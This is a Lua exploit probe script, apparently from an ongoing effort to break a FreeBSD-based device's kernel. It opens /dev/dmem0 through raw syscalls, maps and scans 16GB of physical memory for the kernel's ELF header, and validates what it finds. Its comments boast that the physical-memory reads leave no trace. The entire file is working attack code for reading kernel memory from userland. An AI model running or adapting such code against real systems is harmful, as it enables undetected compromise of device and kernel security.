-- CRASH_CLASS: LOW
-- PROBE 563a: Scan physical memory for kernel ELF header via dmem0 mmap
--
-- 562z PROVED: mmap(dmem0_fd, phys_offset) works with NO trace.
-- Physical memory is readable from userland through device mmap path.
--
-- PLAN: Scan 0 to 16GB at 2MB stride (8192 candidates).
-- At each offset: mmap, read first dword, check for ELF magic, munmap.
-- ELF magic = 0x7F454C46 → LE dword 0x464C457F
--
-- If found: read first 64 bytes of ELF header for validation.

print("=== PROBE 563a: KERNEL ELF SCAN ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rb(a)
    local d = rd(a); if d == nil then return nil end
    if d < 0 then d = d + 0x100000000 end; return d
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local Z = uint64(0)
local sc477 = mk(477)
local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
io.flush()

-- Open /dev/dmem0
local dp = memory.alloc(16)
wd(N(dp), 0x7665642F); wd(N(dp) + 4, 0x656D642F); wd(N(dp) + 8, 0x0000306D)
local ok_o, fd_raw = pcall(function()
    return native.fcall_with_rax(stub, 5, dp, uint64(2))
end)
local fd = ok_o and N(fd_raw) or -999
if fd < 0 then print("OPEN FAIL"); return end
print("dmem0 fd=" .. fd)
io.flush()

-- Scan parameters
local STRIDE = 0x200000   -- 2MB
local MAX_PHYS_HI = 4     -- scan 0 to 4*4GB = 16GB
local PAGE_SIZE = 0x4000   -- 16KB map per check
local ELF_MAGIC = 0x464C457F

local found_count = 0
local interesting = {}

-- munmap = syscall 73
-- munmap(addr, len)

print("scanning 0..16GB stride=2MB")
io.flush()

local checks = 0
local last_report = 0

for hi = 0, MAX_PHYS_HI - 1 do
    -- Each hi represents 4GB
    local lo = 0
    while lo < 0x100000000 do
        local phys_off
        if hi > 0 then
            phys_off = uint64(string.format("0x%X%08X", hi, lo))
        else
            phys_off = uint64(lo)
        end

        -- mmap(0, PAGE_SIZE, PROT_READ, MAP_SHARED, fd, phys_offset)
        local ok_mm, va_raw = pcall(function()
            return sc477(Z, uint64(PAGE_SIZE), uint64(1),
                uint64(0x0001), uint64(fd), phys_off)
        end)

        checks = checks + 1

        if ok_mm then
            local va = N(va_raw)
            if va > 0 then
                -- Read first dword
                local v = rb(va)
                if v and v == ELF_MAGIC then
                    found_count = found_count + 1
                    -- Read more header bytes
                    local v4 = rb(va + 4) or 0
                    local v8 = rb(va + 8) or 0
                    local v12 = rb(va + 12) or 0
                    local v16 = rb(va + 16) or 0
                    local v20 = rb(va + 20) or 0

                    -- ELF class check: byte 4 should be 2 (64-bit)
                    local elf_class = v4 % 256
                    local elf_data = math.floor(v4 / 256) % 256
                    local elf_type = v16 % 65536

                    print(string.format(
                        "*** ELF at phys 0x%X%08X ***", hi, lo))
                    print(string.format(
                        "  header: %08X %08X %08X %08X %08X %08X",
                        v, v4, v8, v12, v16, v20))
                    print(string.format(
                        "  class=%d data=%d type=%d",
                        elf_class, elf_data, elf_type))

                    -- Type 2 = ET_EXEC (kernel), Type 3 = ET_DYN
                    if elf_class == 2 and elf_data == 1 then
                        if elf_type == 2 then
                            print("  >>> KERNEL EXECUTABLE <<<")
                        elseif elf_type == 3 then
                            print("  >>> SHARED OBJECT (module?) <<<")
                        end
                    end
                    io.flush()

                    -- Save reference
                    table.insert(interesting,
                        string.format("0x%X%08X type=%d", hi, lo, elf_type))
                end

                -- Also check for other signatures
                if v and v ~= 0 and v ~= ELF_MAGIC then
                    -- Non-zero, non-ELF: track first few
                    if found_count == 0 and checks <= 10 then
                        -- Print first few non-zero reads for diagnostics
                    end
                end

                -- munmap
                pcall(function()
                    native.fcall_with_rax(stub, 73, uint64(va), uint64(PAGE_SIZE))
                end)
            end
        end

        -- Progress report every 512 checks (~1GB)
        if checks - last_report >= 512 then
            print(string.format("  ...%d checks, %d ELF found (at 0x%X%08X)",
                checks, found_count, hi, lo))
            io.flush()
            last_report = checks
        end

        -- Advance lo by STRIDE
        -- Handle overflow: if lo + STRIDE >= 0x100000000, break to next hi
        if lo > 0x100000000 - STRIDE then
            break
        end
        lo = lo + STRIDE
    end
end

-- ============================================================
-- Results
-- ============================================================
print("")
print(string.format("SCAN COMPLETE: %d checks, %d ELF headers found", checks, found_count))
for _, entry in ipairs(interesting) do
    print("  " .. entry)
end

io.flush()
pcall(function() native.fcall_with_rax(stub, 6, uint64(fd)) end)
local pid2 = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid2 .. (pid2 == pid_val and " ALIVE" or " DEAD"))
print("=== 563a DONE ===")
